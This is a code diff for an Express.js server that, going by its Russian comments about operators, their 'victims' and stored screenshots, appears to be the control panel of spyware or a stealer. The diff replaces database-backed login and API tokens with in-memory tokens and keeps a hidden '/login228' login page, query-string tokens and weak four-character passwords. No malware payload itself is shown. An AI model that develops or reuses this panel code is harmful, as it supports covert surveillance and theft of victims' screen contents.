@@ -42,21 +42,6 @@ async function getDb() {
   }
 }
 
-// Проверка пароля: сначала дефолтный, потом MongoDB
-async function checkPassword(username, password) {
-  if (!CREDENTIALS[username]) return false;
-  if (CREDENTIALS[username] === password) return true;
-  try {
-    const db = await getDb();
-    const s = await db.collection('settings').findOne({ user: username });
-    if (s && s.password && s.password === password) {
-      CREDENTIALS[username] = s.password;
-      return true;
-    }
-  } catch (e) {}
-  return false;
-}
-
 // Коллекции: files (скриншоты+метаданные), settings (настройки операторов)
 
 // ── Оператор (владелец жертвы): старые записи без поля operator относятся к Shonll ──
@@ -208,38 +193,31 @@ async function setOperatorSettings(user, patch) {
   if (patch.password) CREDENTIALS[user] = patch.password;
 }
 
-// ── Token-based auth (для статического сайта на GitHub Pages) ──────────────────
-// ── Token-based auth (для статического сайта на GitHub Pages) ──────────────────
+// ── Token-based auth (токены в памяти, не зависят от MongoDB) ──────────────────
+const validTokens = new Map(); // token -> username
+
 function makeToken() {
   return require('crypto').randomBytes(32).toString('hex');
 }
 
-async function currentUser(req) {
+function currentUser(req) {
   if (req.session && req.session.user) return req.session.user;
-  const db = await getDb();
-  
   const h = req.headers.authorization;
   if (h && h.startsWith('Bearer ')) {
     const t = h.slice(7).trim();
-    const doc = await db.collection('api_tokens').findOne({ token: t });
-    if (doc) return doc.user;
+    if (validTokens.has(t)) return validTokens.get(t);
   }
-  if (req.query && req.query.token) {
-    const doc = await db.collection('api_tokens').findOne({ token: req.query.token });
-    if (doc) return doc.user;
+  if (req.query && req.query.token && validTokens.has(req.query.token)) {
+    return validTokens.get(req.query.token);
   }
   return null;
 }
 
-// ── Auth guard (поддерживает cookie-сессию и Bearer/ query-токен) ──────────────
-async function requireAuth(req, res, next) {
-  try {
-    const user = await currentUser(req);
-    if (user) { req.authUser = user; return next(); }
-    res.status(401).json({ error: 'Unauthorized' });
-  } catch (err) {
-    res.status(500).json({ error: 'Auth check error' });
-  }
+// ── Auth guard ────────────────────────────────────────────────────────────────
+function requireAuth(req, res, next) {
+  const user = currentUser(req);
+  if (user) { req.authUser = user; return next(); }
+  res.status(401).json({ error: 'Unauthorized' });
 }
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -250,10 +228,11 @@ app.get('/login228', (req, res) => {
   res.send(loginHTML(req.query.error));
 });
 
-app.post('/login228', async (req, res) => {
+app.post('/login228', (req, res) => {
   const { username, password } = req.body;
-  const valid = await checkPassword(username, password);
-  if (!valid) return res.redirect('/login228?error=1');
+  if (!CREDENTIALS[username] || CREDENTIALS[username] !== password) {
+    return res.redirect('/login228?error=1');
+  }
   req.session.user = username;
   res.redirect('/');
 });
@@ -262,16 +241,14 @@ app.get('/logout', (req, res) => {
   req.session.destroy(() => res.redirect('/login228'));
 });
 
-// ── JSON auth для статического сайта (GitHub Pages) ────────────────────────────
-app.post('/api/login', async (req, res) => {
+// ── JSON auth для статического сайта ──────────────────────────────────────────
+app.post('/api/login', (req, res) => {
   const { username, password } = req.body || {};
-  const valid = await checkPassword(username, password);
-  if (!valid) {
+  if (!CREDENTIALS[username] || CREDENTIALS[username] !== password) {
     return res.status(401).json({ error: 'Неверный логин или пароль' });
   }
   const token = makeToken();
-  const db = await getDb();
-  await db.collection('api_tokens').insertOne({ token, user: username, createdAt: new Date() });
+  validTokens.set(token, username);
   res.json({ token, user: username });
 });
 
@@ -312,8 +289,7 @@ app.post('/api/settings', requireAuth, async (req, res) => {
   const { displayName, avatar, avatarImage, themeColor, bio, newPassword, currentPassword } = req.body || {};
 
   if (newPassword) {
-    const pwdValid = await checkPassword(user, currentPassword);
-    if (!currentPassword || !pwdValid) {
+    if (!currentPassword || CREDENTIALS[user] !== currentPassword) {
       return res.status(403).json({ error: 'Неверный текущий пароль' });
     }
     if (newPassword.length < 4) {
